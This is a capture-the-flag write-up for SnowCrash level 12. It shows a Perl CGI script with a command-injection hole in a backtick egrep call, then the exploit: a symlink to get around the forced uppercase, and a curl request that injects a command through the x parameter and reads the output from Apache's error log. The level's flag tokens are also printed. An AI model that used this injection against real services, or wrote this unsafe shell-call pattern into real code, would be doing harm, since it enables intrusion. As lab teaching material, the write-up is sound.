# SnowCrash Level 12

## Introduction
When we started the level, we found a `level12.pl` script:
```
#!/usr/bin/env perl
localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```
## Exploitation
We easily understood that the security breach is
```@output = `egrep "^$xx" /tmp/xd 2>&1`;``` 

We attempted injections, but the regex turned our `ls` to `LS`, causing errors. After a day of research, we tried to execute `/bin/ls` and transfer the result to the error file of Apache in `/var/log/apache2/error.log`. We finally got an error: 
```
[Thu Feb 08 13:33:52 2024] [error] [client 127.0.0.1] /*/LS: not found
```
Then, we created a symbolic link between `/bin/ls` and `/tmp/LS`: `ln -s /bin/ls /tmp/LS`. We attempted to execute 

```
curl '127.0.0.1:4646/?x=`/*/ls%3E%262
```
This worked, and we got an `LS` in the error log of Apache.

## Obtaining the Token
We tried the same with `getflag` and finally got the flag! By reading 
```
/var/log/apache2/error.log
``` 
We found:
```
[Thu Feb 08 13:41:20 2024] [error] [client 127.0.0.1] Check flag. Here is your token: g1qKMiRpXf53AWhDaU7FEkczr
flag12@SnowCrash:~$ getflag
Check flag. Here is your token: fa6v5ateaw21peobuub8ipe6s
```

